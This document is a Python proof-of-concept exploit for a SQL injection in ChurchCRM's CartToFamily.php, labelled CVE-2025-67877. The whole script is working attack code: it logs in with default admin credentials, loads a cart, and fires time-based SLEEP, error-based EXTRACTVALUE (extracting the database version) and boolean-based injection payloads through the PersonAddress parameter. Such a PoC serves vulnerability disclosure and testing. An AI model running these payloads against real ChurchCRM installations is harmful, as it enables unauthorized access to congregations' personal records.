#!/usr/bin/env python3
"""
CVE-2025-67877 - ChurchCRM SQL Injection PoC

Vulnerability: CartToFamily.php PersonAddress parameter SQL Injection
The PersonAddress POST parameter is not cast to 'int' type, allowing SQL injection.

Vulnerable code (src/CartToFamily.php):
  Line 29: $iPersonAddress = InputUtils::legacyFilterInput($_POST['PersonAddress']);  // Missing 'int' type
  Line 32: $sSQL = 'SELECT * FROM person_per WHERE per_ID = ' . $iPersonAddress;      // Direct concatenation
"""
import requests
import sys
import time
import re

TARGET_URL = "http://localhost:8067"
USERNAME = "Admin"
PASSWORD = "changeme"

class ChurchCRMExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def login(self):
        print("[*] Attempting login...")
        login_url = f"{self.target_url}/session/begin"
        
        self.session.get(login_url)
        
        login_data = {
            "User": USERNAME,
            "Password": PASSWORD
        }
        
        resp = self.session.post(login_url, data=login_data, allow_redirects=True)
        
        check_resp = self.session.get(f"{self.target_url}/v2/dashboard")
        if "session/begin" in check_resp.url:
            print("[-] Login failed")
            return False
            
        print("[+] Login successful")
        return True
    
    def add_person_to_cart(self, person_id):
        url = f"{self.target_url}/api/person/{person_id}/addToCart"
        resp = self.session.post(url)
        return resp.status_code == 200
    
    def get_cart_contents(self):
        resp = self.session.get(f"{self.target_url}/CartToFamily.php")
        if "Your cart is empty" in resp.text:
            return []
        person_ids = re.findall(r'name="role(\d+)"', resp.text)
        return person_ids
    
    def setup_cart(self):
        print("[*] Setting up cart with test persons...")
        
        for pid in [2, 3, 4, 5, 6, 7, 8, 9, 10]:
            if self.add_person_to_cart(pid):
                print(f"[+] Added person {pid} to cart")
            
            cart = self.get_cart_contents()
            if len(cart) > 0:
                print(f"[+] Cart now contains persons: {cart}")
                return cart
        
        return self.get_cart_contents()
    
    def test_time_based_sqli(self, person_ids, sleep_time=5):
        print(f"\n{'='*60}")
        print(f"[*] TEST 1: Time-based SQL Injection (SLEEP({sleep_time}))")
        print(f"{'='*60}")
        
        if not person_ids:
            print("[-] No persons in cart")
            return False, 0
        
        target_page = f"{self.target_url}/CartToFamily.php"
        
        payload = f"1 AND SLEEP({sleep_time})-- -"
        
        post_data = {
            "FamilyID": "0",
            "FamilyName": f"TestFam_{int(time.time())}",
            "PersonAddress": payload,
            "Address1": "",
            "Address2": "",
            "City": "",
            "State": "",
            "StateTextbox": "",
            "Zip": "",
            "Country": "United States",
            "HomePhone": "",
            "WorkPhone": "",
            "CellPhone": "",
            "Email": "",
            "WeddingDate": "",
            "Submit": "Add to Family",
        }
        
        for pid in person_ids:
            post_data[f"role{pid}"] = "1"
        
        print(f"[*] Payload: PersonAddress={payload}")
        print(f"[*] Expected delay: ~{sleep_time} seconds")
        
        start_time = time.time()
        resp = self.session.post(target_page, data=post_data, timeout=sleep_time + 10)
        elapsed = time.time() - start_time
        
        print(f"[*] Actual response time: {elapsed:.2f} seconds")
        
        if elapsed >= sleep_time - 0.5:
            print(f"[+] SUCCESS: Response delayed by {elapsed:.2f}s!")
            print(f"[+] TIME-BASED SQL INJECTION CONFIRMED!")
            return True, elapsed
        else:
            print(f"[-] Response too fast ({elapsed:.2f}s < {sleep_time}s)")
            return False, elapsed
    
    def test_error_based_sqli(self, person_ids):
        print(f"\n{'='*60}")
        print("[*] TEST 2: Error-based SQL Injection (EXTRACTVALUE)")
        print(f"{'='*60}")
        
        if not person_ids:
            return False, None
        
        target_page = f"{self.target_url}/CartToFamily.php"
        
        payload = "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION()),0x7e))-- -"
        
        post_data = {
            "FamilyID": "0",
            "FamilyName": f"TestFam_{int(time.time())}",
            "PersonAddress": payload,
            "Address1": "",
            "City": "",
            "State": "",
            "Zip": "",
            "Country": "United States",
            "Submit": "Add to Family",
        }
        
        for pid in person_ids:
            post_data[f"role{pid}"] = "1"
        
        print(f"[*] Payload: PersonAddress={payload}")
        
        resp = self.session.post(target_page, data=post_data)
        
        version_match = re.search(r'~([0-9]+\.[0-9]+\.[0-9]+[^~]*)~', resp.text)
        if version_match:
            db_version = version_match.group(1)
            print(f"[+] SUCCESS: Extracted DB version: {db_version}")
            print(f"[+] ERROR-BASED SQL INJECTION CONFIRMED!")
            return True, db_version
        
        if "XPATH syntax error" in resp.text:
            print("[+] XPATH syntax error detected - injection point confirmed")
            return True, "XPATH error"
        
        print("[-] Could not extract data via EXTRACTVALUE")
        return False, None
    
    def test_boolean_based_sqli(self, person_ids):
        print(f"\n{'='*60}")
        print("[*] TEST 3: Boolean-based SQL Injection")
        print(f"{'='*60}")
        
        if not person_ids:
            return False
        
        target_page = f"{self.target_url}/CartToFamily.php"
        
        def make_request(payload):
            post_data = {
                "FamilyID": "0",
                "FamilyName": f"TestFam_{int(time.time())}",
                "PersonAddress": payload,
                "Address1": "",
                "City": "",
                "State": "",
                "Zip": "",
                "Country": "United States",
                "Submit": "Add to Family",
            }
            for pid in person_ids:
                post_data[f"role{pid}"] = "1"
            return self.session.post(target_page, data=post_data)
        
        payload_true = "1 AND 1=1-- -"
        payload_false = "1 AND 1=2-- -"
        
        print(f"[*] Testing TRUE condition: {payload_true}")
        resp_true = make_request(payload_true)
        len_true = len(resp_true.text)
        
        print(f"[*] Testing FALSE condition: {payload_false}")
        resp_false = make_request(payload_false)
        len_false = len(resp_false.text)
        
        print(f"[*] Response length (TRUE):  {len_true}")
        print(f"[*] Response length (FALSE): {len_false}")
        
        if abs(len_true - len_false) > 100:
            print(f"[+] SUCCESS: Different responses for TRUE/FALSE conditions!")
            print(f"[+] BOOLEAN-BASED SQL INJECTION CONFIRMED!")
            return True
        
        if "error" in resp_false.text.lower() and "error" not in resp_true.text.lower():
            print(f"[+] SUCCESS: FALSE condition triggered error!")
            print(f"[+] BOOLEAN-BASED SQL INJECTION CONFIRMED!")
            return True
            
        print("[-] Could not confirm boolean-based injection")
        return False

    def run(self):
        print("=" * 70)
        print("CVE-2025-67877 - ChurchCRM SQL Injection PoC")
        print("Target: CartToFamily.php - PersonAddress parameter")
        print("=" * 70)
        
        if not self.login():
            return False
        
        person_ids = self.setup_cart()
        
        if not person_ids:
            print("[-] Failed to setup cart - no persons available")
            return False
        
        print(f"\n[*] Cart ready with persons: {person_ids}")
        
        time_result, time_elapsed = self.test_time_based_sqli(person_ids, sleep_time=5)
        
        self.setup_cart()
        error_result, db_version = self.test_error_based_sqli(person_ids)
        
        self.setup_cart()
        bool_result = self.test_boolean_based_sqli(person_ids)
        
        print("\n" + "=" * 70)
        print("FINAL RESULTS:")
        print("=" * 70)
        print(f"  Time-based SQLi:    {'CONFIRMED' if time_result else 'NOT CONFIRMED'} (delay: {time_elapsed:.2f}s)")
        print(f"  Error-based SQLi:   {'CONFIRMED' if error_result else 'NOT CONFIRMED'} {f'(version: {db_version})' if db_version else ''}")
        print(f"  Boolean-based SQLi: {'CONFIRMED' if bool_result else 'NOT CONFIRMED'}")
        print("=" * 70)
        
        if time_result or error_result or bool_result:
            print("\n[+] VULNERABILITY CONFIRMED: CVE-2025-67877")
            print("[+] SQL Injection in CartToFamily.php PersonAddress parameter")
            print("[+] Root cause: Missing 'int' type cast in InputUtils::legacyFilterInput()")
            return True
        else:
            print("\n[-] Could not definitively confirm vulnerability")
            return False

def main():
    exploit = ChurchCRMExploit(TARGET_URL)
    success = exploit.run()
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
